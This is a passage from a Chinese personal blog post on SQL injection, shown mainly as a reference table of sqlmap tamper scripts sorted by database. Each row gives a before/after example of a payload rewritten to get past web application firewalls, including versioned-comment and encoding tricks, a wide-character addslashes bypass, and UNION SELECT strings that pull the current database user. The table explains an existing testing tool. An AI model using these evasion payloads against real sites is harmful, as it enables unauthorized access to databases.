‘1’=’1<br>1 AND %00%271%00%27=%00%271|<br>|    |4|ifnull2ifisnull.py|绕过对 IFNULL 过滤。<br>|IFNULL(1, 2)<br>IF(ISNULL(1),2,1)|<br>|    |5|space2mssqlhash.py|替换空格|1 AND 9227=9227<br>1%23%0AAND%23%0A9227=9227|<br>|    |6|modsecurityversioned.py|过滤空格，包含完整的查询版本注释|1 AND 2&gt;1–<br>1 /<em>!30874AND 2&gt;1</em>/–|<br>|    |7|space2mysqlblank.py|空格替换其它空白符号|SELECT id FROM users<br>SELECT%0Bid%0BFROM%A0users|<br>|    |8|between.py|用between替换大于号|1 AND A &gt; B–<br>1 AND A NOT BETWEEN 0 AND B–|<br>|    |9|modsecurityzeroversioned.py|包含了完整的查询与零版本注释|1 AND 2&gt;1–<br>1 /<em>!00000AND 2&gt;1</em>/–|<br>|    |10|space2mysqldash.py|替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）|1 AND 9227=9227<br>1–%0AAND–%0A9227=9227|<br>|    |11|bluecoat.py|代替空格字符后与一个有效的随机空白字符的SQL语句。然后替换=为like|SELECT id FROM users where id = 1<br>SELECT%09id FROM users where id LIKE 1|<br>|    |12|percentage.py|asp允许每个字符前面添加一个%号|SELECT FIELD FROM TABLE<br>%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E|<br>|    |13|charencode.py|url编码|SELECT FIELD FROM%20TABLE<br>%53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45|<br>|    |14|randomcase.py|随机大小写|INSERT<br>InsERt|<br>|    |15|versionedkeywords.py|Encloses each nonfunction keyword with versioned MySQL comment|1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#<br>1/<em>!UNION**!ALL**!SELECT**!NULL</em>/,/<em>!NULL</em>/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/<em>!AS**!CHAR</em>/),CHAR(32)),CHAR(58,100,114,117,58))#|<br>|    |16|space2comment.py|Replaces space character (‘ ‘) with comments ‘/<strong>/’|SELECT id FROM users<br>SELECT//id//FROM/</strong>/users|<br>|    |17|charunicodeencode.py|字符串 unicode 编码|SELECT FIELD%20FROM TABLE<br>%u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′|<br>|    |18|versionedmorekeywords.py|注释绕过|1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#<br>1/<em>!UNION**!ALL**!SELECT**!NULL</em>/,/<em>!NULL</em>/,/<em>!CONCAT</em>/(/<em>!CHAR</em>/(58,122,114,115,58),/<em>!IFNULL</em>/(CAST(/<em>!CURRENT_USER</em>/()/<em>!AS**!CHAR</em>/),/<em>!CHAR</em>/(32)),/<em>!CHAR</em>/(58,115,114,121,58))#|<br>|    |19|space2morehash.py|空格替换为 #号 以及更多随机字符串 换行符|1 AND 9227=9227<br>1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227|<br>|MySQL&lt;5.1|20|halfversionedmorekeywords.py|关键字前加注释|value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’=’QDWa<br>value’/<em>!0UNION/</em>!0ALL/<em>!0SELECT/</em>!0CONCAT(/<em>!0CHAR(58,107,112,113,58),/</em>!0IFNULL(CAST(/<em>!0CURRENT_USER()/</em>!0AS/<em>!0CHAR),/</em>!0CHAR(32)),/<em>!0CHAR(58,97,110,121,58)), NULL, NULL#/</em>!0AND ‘QDWa’=’QDWa|<br>|    |21|halfversionedmorekeywords.py|当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论|1(“value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’=’QDWa”)<br>2.”value’/<em>!0UNION/</em>!0ALL/<em>!0SELECT/</em>!0CONCAT(/<em>!0CHAR(58,107,112,113,58),/</em>!0IFNULL(CAST(/<em>!0CURRENT_USER()/</em>!0AS/<em>!0CHAR),/</em>!0CHAR(32)),/<em>!0CHAR(58,97,110,121,58)),/</em>!0NULL,/<em>!0NULL#/</em>!0AND ‘QDWa’=’QDWa”|<br>|    <br><br><br><br>Oracle|1|greatest.py|绕过过滤’&gt;’ ，GREATEST替换大于号|1 AND A &gt; B<br>1 AND GREATEST(A,B+1)=A|<br>|    |2|apostrophenullencode.py|绕过过滤双引号，替换字符和双引号|1 AND ‘1’=’1<br>1 AND %00%271%00%27=%00%271|<br>|    |3|between.py|用between替换大于号|1 AND A &gt; B–<br>1 AND A NOT BETWEEN 0 AND B–|<br>|    |4|charencode.py|url编码|SELECT FIELD FROM%20TABLE<br>%53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45|<br>|    |5|randomcase.py|随机大小写|INSERT<br>InsERt|<br>|    |6|charunicodeencode.py|字符串 unicode 编码|SELECT FIELD%20FROM TABLE<br>%u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′|<br>|    |7|space2comment.py|用 ‘/<strong>/‘代替空格|SELECT id FROM users<br>SELECT//id//FROM/</strong>/users|<br>|    <br><br><br><br><br>PostgreSQL|1|greatest.py|绕过过滤’&gt;’ ，GREATEST替换大于号|1 AND A &gt; B<br>1 AND GREATEST(A,B+1)=A|<br>|    |2|apostrophenullencode.py|绕过过滤双引号，替换字符和双引号|1 AND ‘1’=’1<br>1 AND %00%271%00%27=%00%271|<br>|    |3|between.py|用between替换大于号|1 AND A &gt; B–<br>1 AND A NOT BETWEEN 0 AND B–|<br>|    |4|percentage.py|asp允许每个字符前面添加一个%号|SELECT FIELD FROM TABLE<br>%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E|<br>|    |5|charencode.py|url编码|SELECT FIELD FROM%20TABLE<br>%53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45|<br>|    |6|randomcase.py|随机大小写|INSERT<br>InsERt|<br>|    |7|charunicodeencode.py|字符串 unicode 编码|SELECT FIELD%20FROM TABLE<br>%u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′|<br>|    |8|space2comment.py|用’/<strong>/’代替空格|SELECT id FROM users<br>SELECT//id//FROM/</strong>/users|<br>|Access|1|appendnullbyte.py|在有效负荷结束位置加载零字节字符编码|1 AND 1=1’<br>1 AND 1=1%00|<br>|    <br>others|    |chardoubleencode.py|双url编码(不处理已编码的)|SELECT FIELD FROM%20TABLE<br>%2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545|<br>|    |    |unmagicquotes.py|宽字符绕过 GPC addslashes|1′ AND 1=1<br>1%bf%27 AND 1=1–%20|<br>|    |    |randomcomments.py|用/**/分割sql关键字|INSERT<br>IN//S//ERT|</p>
+</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:1401198693@qq.com">Bbutterf1y</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2020/10/22/SQL%E6%B3%A8%E5%85%A5/">http://example.com/2020/10/22/SQL%E6%B3%A8%E5%85%A5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Bbutterf1y's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/category.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2020/10/22/hexo+github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"><img class="next-cover" src="/img/category.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info"></div></div></a></div></nav></article></main><footer id="footer" style="background: ture"><div id="footer-wrap"><div class="copyright">&copy;2020 By Bbutterf1y</div><div class="footer_custom_text">本博客由<a href="https://demo.jerryc.me/"  target="_blank">butterfly</a>主题大力赞助支持<br>--&nbsp;&nbsp;&nbsp;嗨，别忘了开心每一天！--</div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></section><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a>
+ <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',()=> {preloader.endLoading()})</script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" async="async" mobile="false"></script></div></body></html>
